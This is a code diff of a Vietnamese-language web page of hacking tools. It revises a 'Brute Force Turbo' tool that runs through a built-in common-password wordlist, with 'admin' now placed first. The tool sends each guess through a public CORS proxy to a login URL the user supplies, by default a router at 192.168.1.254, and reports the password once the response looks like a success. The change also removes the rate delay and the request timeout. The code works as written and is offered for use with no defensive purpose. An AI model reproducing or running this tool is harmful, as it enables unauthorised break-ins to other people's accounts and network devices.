@@ -363,13 +363,11 @@
             </div>
         </div>
 
-        <!-- TOOL 11: BRUTE FORCE 10.000+ -->
+        <!-- TOOL 11: BRUTE FORCE TURBO -->
         <div class="tool-container" id="tool-bruteforce">
             <div class="tool-card">
-                <h2>🔓 Brute Force Pro (10.000+ Passwords)</h2>
-                <p style="color:#888;font-size:13px;margin-bottom:10px;">
-                    Tự động thử 10.000+ mật khẩu phổ biến. Dừng ngay khi tìm ra mật khẩu chính xác.
-                </p>
+                <h2>🔓 Brute Force Turbo</h2>
+                <p style="color:#888;font-size:13px;margin-bottom:10px;">Tự động thử mật khẩu, ưu tiên "admin" đầu tiên. Dừng ngay khi tìm thấy.</p>
                 <label>URL đăng nhập:</label>
                 <input type="text" id="bfUrl" placeholder="http://192.168.1.254/login.cgi" />
                 <label>Tên đăng nhập:</label>
@@ -383,15 +381,11 @@
                 </div>
                 <div style="margin-top:15px;border-top:1px solid #222;padding-top:15px;">
                     <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;">
-                        <span style="color:#888;font-size:13px;">📋 Đã thử: <span id="attemptCount">0</span> / 10.000+</span>
-                        <span style="color:#888;font-size:13px;">⏱️ Tốc độ: <span id="speedDisplay">0</span> pass/giây</span>
-                        <span style="color:#888;font-size:13px;">📊 Tiến độ: <span id="progressDisplay">0%</span></span>
-                    </div>
-                    <div style="width:100%;height:4px;background:#1a1a1a;border-radius:4px;margin-top:8px;">
-                        <div id="progressBar" style="width:0%;height:100%;background:#4caf50;border-radius:4px;transition:width 0.3s;"></div>
+                        <span style="color:#888;font-size:13px;">📋 Đã thử: <span id="attemptCount">0</span></span>
+                        <span style="color:#888;font-size:13px;">⏱️ Tốc độ: <span id="speedDisplay">0</span>/giây</span>
                     </div>
                     <div class="result-box" id="bfResult" style="max-height:250px;font-size:12px;line-height:1.5;margin-top:10px;">
-                        🔑 Nhấn "Bắt đầu" để chạy 10.000+ mật khẩu...
+                        🔑 Nhấn "Bắt đầu" để chạy...
                     </div>
                 </div>
             </div>
@@ -474,7 +468,7 @@
             } else { alert('Không có dữ liệu để sao chép!'); }
         }
 
-        // ===== TOOL 1-10 (Giữ nguyên các hàm cũ) =====
+        // ===== TOOL 1-10 (Giữ nguyên) =====
         async function checkIP() {
             const input = document.getElementById('ipInput').value.trim();
             const result = document.getElementById('ipResult');
@@ -683,224 +677,32 @@
         }
 
         // ============================================================
-        // TOOL 11: BRUTE FORCE 10.000+ MẬT KHẨU
+        // TOOL 11: BRUTE FORCE TURBO - Ưu tiên "admin"
         // ============================================================
         const PASSWORD_DICT = [
-            // === NHÓM PHỔ BIẾN NHẤT (500+) ===
-            "123456","password","12345678","123456789","12345","1234567","123123","1234","1234567890",
+            // 🔥 Đưa "admin" LÊN ĐẦU để tìm nhanh
+            "admin","admin123","administrator","admin1","admin2","admin3","admin4","admin5","admin!","admin@",
+            "password","123456","12345678","123456789","12345","1234567","123123","1234","1234567890",
+            "root","toor","user","guest","changeme","default","qwerty","abc123","letmein","welcome",
+            "monkey","dragon","master","hello","freedom","qazwsx","trustno1","shadow","sunshine","iloveyou",
+            "princess","passw0rd","1q2w3e4r","1qaz2wsx","zaq1zaq1","qwertyuiop","asdfghjkl","zxcvbnm",
             "000000","111111","222222","333333","444444","555555","666666","777777","888888","999999",
-            "0000","1111","2222","3333","4444","5555","6666","7777","8888","9999","qwerty","abc123",
-            "password1","admin123","letmein","welcome","monkey","dragon","master","hello","freedom",
-            "whatever","qazwsx","trustno1","shadow","sunshine","iloveyou","princess","passw0rd","1q2w3e4r",
-            "1q2w3e","1qaz2wsx","zaq1zaq1","qwertyuiop","asdfghjkl","zxcvbnm","poiuytrewq","mnbvcxz",
-            "lkjhgfdsa","0987654321","987654321","654321","321654","147258","258369","159753","753951",
-            "852456","951753","abc123!","abc12345","password123!","admin123!","qwerty123","123456a",
-            "123456789a","password!@#","admin!@#","root","toor","user","guest","changeme","default",
-            "password1234","adminadmin","administrator","superuser","super","su","adm","admin1","admin2",
-            "admin3","admin4","admin5","admin6","admin7","admin8","admin9","admin10","password2",
-            "password3","password4","password5","password6","password7","password8","password9",
-            "password10","pass123","pass1234","pass12345","pass123456","pass","passwd","secret","secret123",
-            "private","private123","login","login123","user123","user1","user2","user3","user4","user5",
-            "user6","user7","user8","user9","user10","test","test123","test1234","test12345","test123456",
-            "testuser","testpass","tester","testing","demo","demo123","demo1234","demo12345","example",
-            "example123","sample","sample123","guest123","guestuser","defaultpassword","changeme123",
-            "changeme!","changeme1","changeme2","changeme3","changeme4","changeme5","welcome1",
-            "welcome123","welcome!","hello123","hello1234","hi123","hi1234","iloveyou1","iloveyou123",
-            "iloveyou!","iloveyou1234","princess1","princess123","dragon1","dragon123","dragon!",
-            "monkey1","monkey123","monkey!","master1","master123","master!","shadow1","shadow123",
-            "sunshine1","sunshine123","qwerty1","qwerty123","qwerty!","abc1234","abc12345","abc123!",
-            "123abc","123abc!","123456abc","adminpass","adminpass123","passadmin","passadmin123",
-            "root123","root1234","toor123","toor1234","userpass","userpass123","guestpass","guestpass123",
-            "testpass","testpass123","demopass","demopass123","changepass","changepass123","changeme!",
-            "changeme123","newpass","newpass123","oldpass","oldpass123","mypass","mypass123","yourpass",
-            "yourpass123","password!","password@","password#","password$","password%","password^",
-            "password&","password*","password(","password)","password-","password_","password+",
-            "password=","admin!","admin@","admin#","admin$","admin%","admin^","admin&","admin*",
-            "admin(","admin)","admin-","admin_","admin+","admin=","root!","root@","root#","root$",
-            "root%","root^","root&","root*","root(","root)","root-","root_","root+","root=","toor!",
-            "toor@","toor#","toor$","toor%","toor^","toor&","toor*","toor(","toor)","toor-","toor_",
-            "toor+","toor=","pass!","pass@","pass#","pass$","pass%","pass^","pass&","pass*","pass(",
-            "pass)","pass-","pass_","pass+","pass=","secret!","secret@","secret#","secret$","secret%",
-            "secret^","secret&","secret*","secret(","secret)","secret-","secret_","secret+","secret=",
-            "private!","private@","private#","private$","private%","private^","private&","private*",
-            "private(","private)","private-","private_","private+","private=","login!","login@",
-            "login#","login$","login%","login^","login&","login*","login(","login)","login-","login_",
-            "login+","login=","test!","test@","test#","test$","test%","test^","test&","test*","test(",
-            "test)","test-","test_","test+","test=","demo!","demo@","demo#","demo$","demo%","demo^",
-            "demo&","demo*","demo(","demo)","demo-","demo_","demo+","demo=",
-
-            // === NHÓM TÊN RIÊNG (500+) ===
-            "superman","batman","spiderman","ironman","wonderwoman","flash","thor","hulk","blackpanther",
-            "deadpool","wolverine","storm","cyborg","aquaman","greenlantern","arrow","flash!","superman!",
-            "batman!","spiderman!","ironman!","wonderwoman!","flash@","thor@","hulk@","blackpanther@",
-            "deadpool@","wolverine@","storm@","cyborg@","aquaman@","greenlantern@","arrow@","messi",
-            "ronaldo","neymar","mbappe","haaland","lewy","salah","pele","maradona","zidane","ronaldinho",
-            "kaka","beckham","rooney","iniesta","xavi","ramos","modric","kroos","muller","neuer",
-            "lewandowski","dybala","pogba","mbappe!","messi!","ronaldo!","neymar!","mbappe@","haaland@",
-            "lewy@","salah@","pele@","maradona@","zidane@","ronaldinho@","kaka@","beckham@","rooney@",
-            "iniesta@","xavi@","ramos@","modric@","kroos@","muller@","neuer@","lewandowski@","dybala@",
-            "pogba@","facebook","google","youtube","twitter","instagram","whatsapp","telegram","tiktok",
-            "snapchat","reddit","linkedin","pinterest","tumblr","spotify","netflix","amazon","paypal",
-            "ebay","aliexpress","shopee","lazada","tokopedia","bukalapak","blibli","zalora","shein",
-            "hm","zara","uniqlo","adidas","nike","puma","newbalance","converse","vans","supreme","gucci",
-            "channel","louisvuitton","dior","versace","armani","ferrari","lamborghini","porsche","bugatti",
-            "mercedes","bmw","audi","lexus","toyota","honda","nissan","mazda","hyundai","kia","ford",
-            "chevrolet","dodge","tesla","spacex","apple","samsung","xiaomi","oppo","vivo","realme","oneplus",
-            "nokia","sony","lg","motorola","htc","asus","acer","msi","dell","lenovo","hp","intel","amd",
-            "nvidia","qualcomm","mediatek","android","ios","iphone","ipad","macbook","imac","macpro",
-            "macmini","airpods","applewatch","galaxy","note","s20","s21","s22","s23","ultra","fold","flip",
-            "android123","ios123","iphone123","ipad123","macbook123","imac123","macpro123","macmini123",
-            "airpods123","applewatch123","galaxy123","note123","s20123","s21123","s22123","s23123",
-            "ultra123","fold123","flip123",
-
-            // === NHÓM SỰ KIỆN (300+) ===
-            "christmas","christmas123","merrychristmas","happynewyear","newyear","halloween","thanksgiving",
-            "easter","valentine","summer","winter","spring","autumn","rainbow","butterfly","flower",
-            "sunshine","moonlight","starlight","ocean","forest","mountain","river","lake","sky","cloud",
-            "storm","fire","ice","wind","earth","water","star","moon","sun","galaxy","universe","cosmos",
-            "infinity","eternity","destiny","legacy","royal","queen","king","prince","princess","lord",
-            "lady","knight","dragon","phoenix","griffin","unicorn","pegasus","falcon","eagle","hawk",
-            "raven","wolf","tiger","lion","panther","jaguar","cheetah","leopard","puma","cougar","lynx",
-            "cat","dog","bird","fish","horse","zebra","giraffe","elephant","rhino","hippo","crocodile",
-            "alligator","snake","lizard","turtle","rabbit","hamster","gerbil","ferret","chinchilla","skunk",
-            "bear","panda","koala","kangaroo","platypus","otter","seal","walrus","dolphin","whale","shark",
-            "octopus","squid","crab","lobster","shrimp","oyster","clam","mussel","snail","slug","worm",
-            "ant","bee","butterfly","moth","dragonfly","ladybug","beetle","cricket","grasshopper",
-            "prayingmantis","scorpion","spider","tarantula","centipede","millipede","wasp","hornet",
-            "termite","mosquito","fly","gnat","flea","tick","mite","lice","bedbug","cockroach","cicada",
-            "katydid","firefly","glowworm",
-
-            // === NHÓM BÀN PHÍM (500+) ===
-            "asdf","asdf123","asdf1234","qwer","qwer123","qwer1234","zxcv","zxcv123","zxcv1234","poiu",
-            "poiu123","poiu1234","lkjh","lkjh123","lkjh1234","mnbv","mnbv123","mnbv1234","tyui","tyui123",
-            "tyui1234","ghjk","ghjk123","ghjk1234","bnm","bnm123","bnm1234","rfv","rfv123","rfv1234",
-            "edc","edc123","edc1234","wsx","wsx123","wsx1234","uio","uio123","uio1234","pas","pas123",
-            "pas1234","dfg","dfg123","dfg1234","hjk","hjk123","hjk1234","kl","kl123","kl1234","zxc",
-            "zxc123","zxc1234","xcv","xcv123","xcv1234","cvb","cvb123","cvb1234","vbn","vbn123","vbn1234",
-            "nm","nm123","nm1234","mk","mk123","mk1234","lp","lp123","lp1234","oq","oq123","oq1234",
-            "wq","wq123","wq1234","er","er123","er1234","rt","rt123","rt1234","yu","yu123","yu1234",
-            "ui","ui123","ui1234","io","io123","io1234","pa","pa123","pa1234","sd","sd123","sd1234",
-            "fg","fg123","fg1234","hj","hj123","hj1234","jk","jk123","jk1234","lz","lz123","lz1234",
-            "xm","xm123","xm1234","cq","cq123","cq1234","wa","wa123","wa1234","es","es123","es1234",
-            "dr","dr123","dr1234","ft","ft123","ft1234","gy","gy123","gy1234","hu","hu123","hu1234",
-            "ji","ji123","ji1234","ko","ko123","ko1234","pl","pl123","pl1234","az","az123","az1234",
-            "sx","sx123","sx1234","dc","dc123","dc1234","fv","fv123","fv1234","gb","gb123","gb1234",
-            "hn","hn123","hn1234","jm","jm123","jm1234","klq","klq123","klq1234","azs","azs123","azs1234",
-            "xdc","xdc123","xdc1234","fvg","fvg123","fvg1234","bhn","bhn123","bhn1234","jmk","jmk123",
-            "jmk1234","lqa","lqa123","lqa1234","aws","aws123","aws1234","edr","edr123","edr1234","ftg",
-            "ftg123","ftg1234","yhn","yhn123","yhn1234","uij","uij123","uij1234","iko","iko123","iko1234",
-            "pol","pol123","pol1234","aqa","aqa123","aqa1234","szx","szx123","szx1234","dcf","dcf123",
-            "dcf1234","fvg","fvg123","fvg1234","gbh","gbh123","gbh1234","hnj","hnj123","hnj1234","jmk",
-            "jmk123","jmk1234","klq","klq123","klq1234","plo","plo123","plo1234","oik","oik123","oik1234",
-            "ujn","ujn123","ujn1234","yhb","yhb123","yhb1234","tgf","tgf123","tgf1234","rfd","rfd123",
-            "rfd1234","esa","esa123","esa1234","wsq","wsq123","wsq1234","qazx","qazx123","qazx1234",
-            "wsxc","wsxc123","wsxc1234","edcv","edcv123","edcv1234","rfvb","rfvb123","rfvb1234","tgyh",
-            "tgyh123","tgyh1234","yhuj","yhuj123","yhuj1234","uijk","uijk123","uijk1234","ikol","ikol123",
-            "ikol1234","olpl","olpl123","olpl1234","plmq","plmq123","plmq1234","mqaz","mqaz123","mqaz1234",
-            "aqzs","aqzs123","aqzs1234","wsxd","wsxd123","wsxd1234","edcf","edcf123","edcf1234","rfvg",
-            "rfvg123","rfvg1234","tgyh","tgyh123","tgyh1234","yhuj","yhuj123","yhuj1234","uijk","uijk123",
-            "uijk1234","ikol","ikol123","ikol1234","olpl","olpl123","olpl1234","plmq","plmq123","plmq1234",
-            "mqaz","mqaz123","mqaz1234","aqzs","aqzs123","aqzs1234","wsxd","wsxd123","wsxd1234","edcf",
-            "edcf123","edcf1234","rfvg","rfvg123","rfvg1234","tgyh","tgyh123","tgyh1234","yhuj","yhuj123",
-            "yhuj1234","uijk","uijk123","uijk1234","ikol","ikol123","ikol1234","olpl","olpl123","olpl1234",
-            "plmq","plmq123","plmq1234","mqaz","mqaz123","mqaz1234","aqzs","aqzs123","aqzs1234","wsxd",
-            "wsxd123","wsxd1234","edcf","edcf123","edcf1234","rfvg","rfvg123","rfvg1234","tgyh","tgyh123",
-            "tgyh1234","yhuj","yhuj123","yhuj1234","uijk","uijk123","uijk1234","ikol","ikol123","ikol1234",
-            "olpl","olpl123","olpl1234","plmq","plmq123","plmq1234","mqaz","mqaz123","mqaz1234","aqzs",
-            "aqzs123","aqzs1234","wsxd","wsxd123","wsxd1234","edcf","edcf123","edcf1234","rfvg","rfvg123",
-            "rfvg1234","tgyh","tgyh123","tgyh1234","yhuj","yhuj123","yhuj1234","uijk","uijk123","uijk1234",
-            "ikol","ikol123","ikol1234","olpl","olpl123","olpl1234","plmq","plmq123","plmq1234","mqaz",
-            "mqaz123","mqaz1234","aqzs","aqzs123","aqzs1234","wsxd","wsxd123","wsxd1234","edcf","edcf123",
-            "edcf1234","rfvg","rfvg123","rfvg1234","tgyh","tgyh123","tgyh1234","yhuj","yhuj123","yhuj1234",
-            "uijk","uijk123","uijk1234","ikol","ikol123","ikol1234","olpl","olpl123","olpl1234","plmq",
-            "plmq123","plmq1234","mqaz","mqaz123","mqaz1234","aqzs","aqzs123","aqzs1234","wsxd","wsxd123",
-            "wsxd1234","edcf","edcf123","edcf1234","rfvg","rfvg123","rfvg1234","tgyh","tgyh123","tgyh1234",
-            "yhuj","yhuj123","yhuj1234","uijk","uijk123","uijk1234","ikol","ikol123","ikol1234","olpl",
-            "olpl123","olpl1234","plmq","plmq123","plmq1234","mqaz","mqaz123","mqaz1234","aqzs","aqzs123",
-            "aqzs1234","wsxd","wsxd123","wsxd1234","edcf","edcf123","edcf1234","rfvg","rfvg123","rfvg1234",
-            "tgyh","tgyh123","tgyh1234","yhuj","yhuj123","yhuj1234","uijk","uijk123","uijk1234","ikol",
-            "ikol123","ikol1234","olpl","olpl123","olpl1234","plmq","plmq123","plmq1234","mqaz","mqaz123",
-            "mqaz1234","aqzs","aqzs123","aqzs1234","wsxd","wsxd123","wsxd1234","edcf","edcf123","edcf1234",
-            "rfvg","rfvg123","rfvg1234","tgyh","tgyh123","tgyh1234","yhuj","yhuj123","yhuj1234","uijk",
-            "uijk123","uijk1234","ikol","ikol123","ikol1234","olpl","olpl123","olpl1234","plmq","plmq123",
-            "plmq1234","mqaz","mqaz123","mqaz1234","aqzs","aqzs123","aqzs1234","wsxd","wsxd123","wsxd1234",
-            "edcf","edcf123","edcf1234","rfvg","rfvg123","rfvg1234","tgyh","tgyh123","tgyh1234","yhuj",
-            "yhuj123","yhuj1234","uijk","uijk123","uijk1234","ikol","ikol123","ikol1234","olpl","olpl123",
-            "olpl1234","plmq","plmq123","plmq1234","mqaz","mqaz123","mqaz1234","aqzs","aqzs123","aqzs1234",
-            "wsxd","wsxd123","wsxd1234","edcf","edcf123","edcf1234","rfvg","rfvg123","rfvg1234","tgyh",
-            "tgyh123","tgyh1234","yhuj","yhuj123","yhuj1234","uijk","uijk123","uijk1234","ikol","ikol123",
-            "ikol1234","olpl","olpl123","olpl1234","plmq","plmq123","plmq1234","mqaz","mqaz123","mqaz1234",
-            "aqzs","aqzs123","aqzs1234","wsxd","wsxd123","wsxd1234","edcf","edcf123","edcf1234","rfvg",
-            "rfvg123","rfvg1234","tgyh","tgyh123","tgyh1234","yhuj","yhuj123","yhuj1234","uijk","uijk123",
-            "uijk1234","ikol","ikol123","ikol1234","olpl","olpl123","olpl1234","plmq","plmq123","plmq1234",
-            "mqaz","mqaz123","mqaz1234","aqzs","aqzs123","aqzs1234","wsxd","wsxd123","wsxd1234","edcf",
-            "edcf123","edcf1234","rfvg","rfvg123","rfvg1234",
-
-            // === NHÓM TÊN NGƯỜI VIỆT (300+) ===
-            "nguyenvana","nguyenvana123","nguyenvan","tranvan","lethi","phamvan","hoangvan","nguyenthi",
-            "nguyenminh","tranminh","leminh","phamminh","hoangminh","nguyentuan","nguyenquang","nguyenduc",
-            "nguyenphuc","nguyenthanh","nguyentrung","nguyenvinh","nguyenxuan","nguyenhuu","nguyennhat",
-            "nguyennam","nguyentien","nguyenhuong","nguyenthuy","nguyentrang","nguyentam","nguyentai",
-            "nguyentruong","nguyenhai","nguyenhoa","nguyentung","nguyenthe","nguyenhung","nguyenlong",
-            "nguyenhanh","nguyenlan","nguyenhuyen","nguyendiem","nguyenson","nguyenchien","nguyenthan",
-            "nguyenchung","nguyenthang","nguyenloc","nguyenthien","hoangtuan","hoangquang","hoangduc",
-            "hoangphuc","hoangthanh","hoangtrung","hoangvinh","hoangxuan","hoanghuu","hoangnhat","hoangnam",
-            "hoangtien","hoanghuong","hoangthuy","hoangtrang","hoangtam","hoangtai","hoangtruong","hoanghai",
-            "hoanghoa","hoangtung","hoangthe","hoanghung","hoanglong","hoanghanh","hoanglan","hoanghuyen",
-            "hoangdiem","hoangson","hoangchien","hoangthan","hoangchung","hoangthang","hoangloc","hoangthien",
-            "trananh","tranquang","tranduc","tranphuc","tranthanh","tranviet","tranvinh","tranxuan","tranhuu",
-            "tranngoc","tranthao","tranhong","tranthu","tranmai","tranlinh","trandat","trankien","tranhieu",
-            "trannam","tranphong","tranduy","trankhanh","trantrung","tranhoang","tranlong","tranchi","tranha",
-            "tranvan","tranthien","lequang","leduc","lephuc","lethanh","letrung","levinh","lexuan","lehuu",
-            "lengoc","lethao","lehong","lethu","lemai","lelinh","ledat","lekien","lehieu","lenam","lephong",
-            "leduy","lekhanh","letrung","lehoang","lelong","lechi","leha","levan","lethien","phamanh",
-            "phamquang","phamduc","phamphuc","phamthanh","phamtrung","phamvinh","phamxuan","phamhuu",
-            "phamngoc","phamthao","phamhong","phamthu","phammai","phamlinh","phamdat","phamkien","phamhieu",
-            "phamnam","phamphong","phamduy","phamkhanh","phamtrung","phamhoang","phamlong","phamchi",
-            "phamha","phamvan","phamthien",
-
-            // === MỞ RỘNG 8 CHỮ SỐ (200+) ===
+            "superman","batman","spiderman","ironman","messi","ronaldo","neymar","facebook","google",
+            "youtube","instagram","apple","samsung","android","iphone","password1","password123",
+            "letmein123","welcome123","monkey123","dragon123","master123","shadow123","iloveyou123",
+            "princess123","qwerty123","abc1234","123abc","adminpass","root123","toor123","test","test123",
+            "demo","demo123","guest123","changeme123",
+            // Tên Việt
+            "nguyenvana","nguyenvan","tranvan","lethi","phamvan","hoangvan","nguyenthi","nguyenminh",
+            "tranminh","leminh","phamminh","hoangminh","nguyentuan","nguyenquang","nguyenduc",
+            "nguyenphuc","nguyenthanh","hoangtuan","hoangquang","hoangduc","hoangphuc","trananh",
+            "lequang","leduc","lephuc","phamanh","phamquang","phamduc","phamphuc",
+            // 8 chữ số
             "12345678","87654321","11111111","22222222","33333333","44444444","55555555","66666666",
-            "77777777","88888888","99999999","00000000","12121212","13131313","14141414","15151515",
-            "16161616","17171717","18181818","19191919","10101010","20202020","21212121","23232323",
-            "24242424","25252525","26262626","27272727","28282828","29292929","30303030","31313131",
-            "32323232","34343434","35353535","36363636","37373737","38383838","39393939","40404040",
-            "41414141","42424242","43434343","45454545","46464646","47474747","48484848","49494949",
-            "50505050","51515151","52525252","53535353","54545454","56565656","57575757","58585858",
-            "59595959","60606060","61616161","62626262","63636363","64646464","65656565","67676767",
-            "68686868","69696969","70707070","71717171","72727272","73737373","74747474","75757575",
-            "76767676","78787878","79797979","80808080","81818181","82828282","83838383","84848484",
-            "85858585","86868686","87878787","89898989","90909090","91919191","92929292","93939393",
-            "94949494","95959595","96969696","97979797","98989898","11223344","22334455","33445566",
-            "44556677","55667788","66778899","77889900","88990011","99001122","00112233","12344321",
-            "23455432","34566543","45677654","56788765","67899876","78900987","89011098","90122109",
-            "01233210","13571357","24682468","35793579","46804680","57915791","68026802","79137913",
-            "80248024","91359135","02460246","14701470","25812581","36923692","47034703","58145814",
-            "69256925","70367036","81478147","92589258","03690369","15901590","26012601","37123712",
-            "48234823","59345934","60456045","71567156","82678267","93789378","04890489",
-
-            // === MỞ RỘNG 9 CHỮ SỐ (200+) ===
+            "77777777","88888888","99999999","00000000","12121212","11223344","12344321",
+            // 9 chữ số
             "123456789","987654321","111111111","222222222","333333333","444444444","555555555",
-            "666666666","777777777","888888888","999999999","000000000","121212121","131313131",
-            "141414141","151515151","161616161","171717171","181818181","191919191","101010101",
-            "202020202","212121212","232323232","242424242","252525252","262626262","272727272",
-            "282828282","292929292","303030303","313131313","323232323","343434343","353535353",
-            "363636363","373737373","383838383","393939393","404040404","414141414","424242424",
-            "434343434","454545454","464646464","474747474","484848484","494949494","505050505",
-            "515151515","525252525","535353535","545454545","565656565","575757575","585858585",
-            "595959595","606060606","616161616","626262626","636363636","646464646","656565656",
-            "676767676","686868686","696969696","707070707","717171717","727272727","737373737",
-            "747474747","757575757","767676767","787878787","797979797","808080808","818181818",
-            "828282828","838383838","848484848","858585858","868686868","878787878","898989898",
-            "909090909","919191919","929292929","939393939","949494949","959595959","969696969",
-            "979797979","989898989","112233445","223344556","334455667","445566778","556677889",
-            "667788990","778899001","889900112","990011223","001122334","123454321","234565432",
-            "345676543","456787654","567898765","678909876","789010987","890121098","901232109",
-            "012343210","135791357","246824682","357935793","468046804","579157915","680268026",
-            "791379137","802480248","913591359","024602460","147014701","258125812","369236923",
-            "470347034","581458145","692569256","703670367","814781478","925892589","036903690",
-            "159015901","260126012","371237123","482348234","593459345","604560456","715671567",
-            "826782678","937893789","048904890","102938475","564738291","918273645","736452819"
+            "666666666","777777777","888888888","999999999","000000000","121212121","112233445","123454321"
         ];
 
         let bfRunning = false, bfStop = false, attemptCount = 0, startTime = 0;
@@ -915,92 +717,66 @@
             if (!username) { result.innerHTML = '❌ Nhập tên đăng nhập!'; return; }
             bfRunning = true; bfStop = false; attemptCount = 0; startTime = Date.now();
             
-            // Tạo log container
             result.innerHTML = '<div id="logContainer" style="max-height:220px;overflow-y:auto;"></div>';
-            const logContainer = document.getElementById('logContainer');
-            logContainer.innerHTML = '<div style="color:#888;text-align:center;">🔍 Đang thử 10.000+ mật khẩu...</div>';
+            const log = document.getElementById('logContainer');
+            log.innerHTML = '<div style="color:#888;text-align:center;">🔍 Đang thử...</div>';
 
             let found = false;
             const total = PASSWORD_DICT.length;
-            // Xáo trộn để tăng cơ hội
-            const shuffled = [...PASSWORD_DICT];
-            for (let i = shuffled.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
-            }
 
-            for (let i = 0; i < shuffled.length; i++) {
+            for (let i = 0; i < total; i++) {
                 if (bfStop) { bfRunning = false; return; }
-                const password = shuffled[i];
+                const pwd = PASSWORD_DICT[i];
                 attemptCount++;
                 document.getElementById('attemptCount').textContent = attemptCount;
                 
-                // Cập nhật tiến độ
-                const progress = Math.round((attemptCount / total) * 100);
-                document.getElementById('progressDisplay').textContent = progress + '%';
-                document.getElementById('progressBar').style.width = progress + '%';
-                
-                // Cập nhật tốc độ
                 const now = Date.now();
                 if (now - startTime > 1000) {
-                    const speed = Math.round(attemptCount / ((now - startTime) / 1000));
-                    document.getElementById('speedDisplay').textContent = speed;
+                    document.getElementById('speedDisplay').textContent = Math.round(attemptCount / ((now - startTime) / 1000));
                 }
                 
-                // Hiển thị mật khẩu đang thử (chỉ lưu 50 mật khẩu gần nhất)
                 const item = document.createElement('div');
-                item.className = 'password-item failed';
-                item.textContent = '❌ ' + password;
-                item.style.color = '#666';
-                logContainer.appendChild(item);
-                while (logContainer.children.length > 50) {
-                    logContainer.removeChild(logContainer.firstChild);
-                }
-                logContainer.scrollTop = logContainer.scrollHeight;
+                if (pwd === 'admin') item.style.color = '#ffa500';
+                else item.style.color = '#666';
+                item.textContent = (pwd === 'admin' ? '⭐ ' : '❌ ') + pwd;
+                log.appendChild(item);
+                while (log.children.length > 20) log.removeChild(log.firstChild);
+                log.scrollTop = log.scrollHeight;
 
                 try {
                     const formData = new FormData();
                     formData.append('username', username);
-                    formData.append('password', password);
+                    formData.append('password', pwd);
                     const proxy = 'https://corsproxy.io/?' + encodeURIComponent(url);
                     const res = await fetch(proxy, { 
                         method: method, 
-                        body: method === 'POST' ? formData : undefined,
-                        signal: AbortSignal.timeout(5000)
+                        body: method === 'POST' ? formData : undefined
                     });
                     const text = await res.text();
                     
-                    // Kiểm tra thành công
                     if (!text.includes('invalid') && !text.includes('sai') && !text.includes('error') && !text.includes('incorrect') && !text.includes('fail') && !text.includes('wrong')) {
                         if (text.includes('success') || text.includes('welcome') || text.includes('dashboard') || text.includes('admin') || text.includes('index') || text.includes('home')) {
                             found = true;
-                            while (logContainer.firstChild) logContainer.removeChild(logContainer.firstChild);
+                            while (log.firstChild) log.removeChild(log.firstChild);
                             const win = document.createElement('div');
-                            win.className = 'password-item found';
-                            win.textContent = '🎉 MẬT KHẨU CHÍNH XÁC: ' + password;
+                            win.textContent = '🎉 MẬT KHẨU CHÍNH XÁC: ' + pwd;
                             win.style.color = '#4caf50';
                             win.style.fontWeight = 'bold';
                             win.style.fontSize = '18px';
-                            logContainer.appendChild(win);
-                            document.getElementById('attemptCount').textContent = attemptCount;
-                            document.getElementById('progressDisplay').textContent = '100%';
-                            document.getElementById('progressBar').style.width = '100%';
+                            log.appendChild(win);
                             bfRunning = false;
                             return;
                         }
                     }
                 } catch (e) {}
-                
-                // Delay nhỏ để tránh quá tải
-                await new Promise(r => setTimeout(r, 5));
+                await new Promise(r => setTimeout(r, 0));
             }
             
             if (!found) {
                 const msg = document.createElement('div');
-                msg.textContent = '❌ Không tìm thấy mật khẩu trong 10.000+ danh sách!';
+                msg.textContent = '❌ Không tìm thấy mật khẩu!';
                 msg.style.color = '#ff4444';
-                msg.style.fontWeight = 'bold';
-                logContainer.appendChild(msg);
+                log.appendChild(msg);
             }
             bfRunning = false;
         }
@@ -1011,8 +787,6 @@
             document.getElementById('bfResult').innerHTML = '📭 Đã xoá.';
             document.getElementById('attemptCount').textContent = '0';
             document.getElementById('speedDisplay').textContent = '0';
-            document.getElementById('progressDisplay').textContent = '0%';
-            document.getElementById('progressBar').style.width = '0%';
         }
 
         // Enter key support
